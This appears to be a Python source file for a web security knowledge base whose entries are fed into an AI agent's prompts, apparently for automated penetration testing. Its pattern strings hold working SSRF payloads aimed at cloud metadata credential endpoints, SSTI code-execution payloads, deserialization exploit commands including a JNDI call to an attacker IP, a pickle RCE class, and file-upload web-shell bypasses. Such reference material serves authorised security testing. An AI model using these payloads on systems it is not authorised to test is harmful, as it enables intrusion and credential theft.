"""Web application security knowledge base.

Deep knowledge about web vulnerabilities:
1. Server-Side Request Forgery (SSRF)
2. Server-Side Template Injection (SSTI)
3. Insecure deserialization
4. Business logic flaws
5. File upload vulnerabilities
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WebAppPattern:
    """A web application security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WEBAPP_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "web-001", "name": "Server-Side Request Forgery",
        "category": "ssrf", "severity": "critical",
        "desc": "Exploiting SSRF vulnerabilities.",
        "detection": (
            "SSRF (Server-Side Request Forgery):\n"
            "DETECTION:\n"
            "  - Any parameter that accepts URLs/hostnames\n"
            "  - Import from URL features\n"
            "  - PDF/image generators\n"
            "  - Webhook endpoints\n"
            "  - URL preview/unfurling\n"
            "BASIC PAYLOADS:\n"
            "  http://127.0.0.1\n"
            "  http://localhost\n"
            "  http://[::1]  # IPv6 localhost\n"
            "  http://0.0.0.0\n"
            "  http://169.254.169.254  # AWS metadata\n"
            "  http://metadata.google.internal  # GCP metadata\n"
            "BYPASS TECHNIQUES:\n"
            "  # DNS rebinding\n"
            "  # Use service like rebind.it\n"
            "  # Decimal IP: http://2130706433 (127.0.0.1)\n"
            "  # Octal: http://0177.0.0.1\n"
            "  # Hex: http://0x7f000001\n"
            "  # IPv6 mapping: http://[::ffff:127.0.0.1]\n"
            "  # URL encoding: http://127.0.0.1%23@evil.com\n"
            "  # Redirect: Point your domain to 127.0.0.1\n"
            "CLOUD METADATA:\n"
            "  # AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n"
            "  # GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
            "  # Azure: http://169.254.169.254/metadata/identity/oauth2/token\n"
            "TOOLS:\n"
            "  SSRFmap, Gopherus (for gopher:// SSRF)"
        ),
        "tools": ["ssrfmap", "gopherus", "burp"],
    },
    {
        "id": "web-002", "name": "Server-Side Template Injection",
        "category": "ssti", "severity": "critical",
        "desc": "Exploiting SSTI for RCE.",
        "detection": (
            "SSTI (Server-Side Template Injection):\n"
            "DETECTION:\n"
            "  # Inject math expressions\n"
            "  {{7*7}} → 49  # Jinja2, Twig\n"
            "  ${7*7} → 49  # FreeMarker, Velocity\n"
            "  #{7*7} → 49  # Thymeleaf\n"
            "  {{7*'7'}} → 7777777  # Jinja2 confirmed\n"
            "  {{7*'7'}} → 49  # Twig confirmed\n"
            "EXPLOITATION:\n"
            "  JINJA2 (Python):\n"
            "    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "    {{''.__class__.__mro__[2].__subclasses__()}}\n"
            "  TWIG (PHP):\n"
            "    {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
            "  FREEMARKER (Java):\n"
            "    <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
            "  VELOCITY (Java):\n"
            "    #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))\n"
            "  PEBBLE (Java):\n"
            "    {{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}\n"
            "TOOL:\n"
            "  tplmap -u 'http://target.com/?name=*' --os-shell"
        ),
        "tools": ["tplmap", "burp"],
    },
    {
        "id": "web-003", "name": "Insecure Deserialization",
        "category": "deserialization", "severity": "critical",
        "desc": "Exploiting deserialization vulnerabilities.",
        "detection": (
            "INSECURE DESERIALIZATION:\n"
            "JAVA:\n"
            "  # Detect: Base64 encoded with 'rO0AB' or 'aced0005'\n"
            "  # Content-Type: application/x-java-serialized-object\n"
            "  # Tools:\n"
            "  ysoserial <gadget_chain> '<command>'\n"
            "  # Common chains: CommonsCollections1-7, CommonsBeanutils\n"
            "  java -jar ysoserial.jar CommonsCollections7 'id' | base64\n"
            "  # JNDI injection\n"
            "  java -jar JNDI-Injection-Exploit.jar -C 'command' -A <attacker_ip>\n"
            "PHP:\n"
            "  # Detect: O:8:\"ClassName\":1:{...} format\n"
            "  # Magic methods: __wakeup(), __destruct(), __toString()\n"
            "  # PHPGGC (PHP Generic Gadget Chains)\n"
            "  phpggc <framework>/<chain> <command>\n"
            "  phpggc Laravel/RCE1 system id\n"
            "PYTHON:\n"
            "  # Detect: pickle protocol bytes\n"
            "  # pickle.loads() on untrusted data → RCE\n"
            "  import pickle, os\n"
            "  class Exploit:\n"
            "    def __reduce__(self): return (os.system, ('id',))\n"
            "  pickle.dumps(Exploit())\n"
            ".NET:\n"
            "  # Detect: AAEAAAD or TypeConfuseDelegate\n"
            "  ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c 'cmd'"
        ),
        "tools": ["ysoserial", "phpggc", "burp"],
    },
    {
        "id": "web-004", "name": "File Upload Vulnerabilities",
        "category": "file_upload", "severity": "critical",
        "desc": "Exploiting insecure file upload functionality.",
        "detection": (
            "FILE UPLOAD VULNERABILITIES:\n"
            "BYPASS TECHNIQUES:\n"
            "  EXTENSION BYPASS:\n"
            "    - Double extension: shell.php.jpg\n"
            "    - Null byte: shell.php%00.jpg (older systems)\n"
            "    - Alternative extensions: .php5, .phtml, .phar\n"
            "    - Case variation: shell.PhP\n"
            "    - Trailing characters: shell.php.\n"
            "  CONTENT-TYPE BYPASS:\n"
            "    - Change Content-Type to image/jpeg\n"
            "    - Keep PHP content, change MIME type\n"
            "  MAGIC BYTES:\n"
            "    - Prepend GIF89a to PHP file\n"
            "    - Embed PHP in PNG IDAT chunk\n"
            "    - EXIF data injection in JPEG\n"
            "  .HTACCESS UPLOAD:\n"
            "    - Upload .htaccess: AddType application/x-httpd-php .jpg\n"
            "    - Then upload shell.jpg with PHP code\n"
            "  POLYGLOT FILES:\n"
            "    - Valid image + valid PHP/JSP\n"
            "    - Passes both image validation and code execution\n"
            "POST-UPLOAD:\n"
            "  - Find upload path (check response/source)\n"
            "  - Directory traversal in filename: ../../shell.php\n"
            "  - Race condition: upload + access before cleanup\n"
            "  - Zip slip: ../../../shell.php in zip archive"
        ),
        "tools": ["burp", "ffuf"],
    },
    {
        "id": "web-005", "name": "Business Logic Vulnerabilities",
        "category": "business_logic", "severity": "high",
        "desc": "Exploiting business logic flaws.",
        "detection": (
            "BUSINESS LOGIC VULNERABILITIES:\n"
            "AUTHENTICATION LOGIC:\n"
            "  - Skip steps in multi-step auth\n"
            "  - Password reset token reuse\n"
            "  - Account lockout bypass (different endpoints)\n"
            "  - OAuth state parameter missing\n"
            "  - Remember-me token prediction\n"
            "AUTHORIZATION LOGIC:\n"
            "  - Horizontal privilege escalation (access other users' data)\n"
            "  - Vertical privilege escalation (access admin functions)\n"
            "  - Function-level access control missing\n"
            "  - IDOR in multi-step processes\n"
            "TRANSACTION LOGIC:\n"
            "  - Race conditions in purchases\n"
            "  - Negative quantity/price manipulation\n"
            "  - Currency rounding exploitation\n"
            "  - Coupon/discount code reuse\n"
            "  - Price manipulation in client-side cart\n"
            "WORKFLOW BYPASS:\n"
            "  - Skip payment step\n"
            "  - Modify hidden form fields\n"
            "  - Direct object reference to final step\n"
            "  - Replay completed transactions\n"
            "TESTING APPROACH:\n"
            "  - Map all application workflows\n"
            "  - Identify assumptions in each step\n"
            "  - Test each assumption individually\n"
            "  - Focus on financial/privilege-related flows"
        ),
        "tools": ["burp", "custom-scripts"],
    },
]


class WebAppSecurityKB:
    """Web application security knowledge base.

    Provides web vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WebAppPattern] = {}
        self._log = logger.bind(component="webapp_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load web app patterns."""
        for data in WEBAPP_PATTERNS:
            pattern = WebAppPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WebAppPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_webapp_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build web app security prompt."""
        lines = ["## Web Application Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
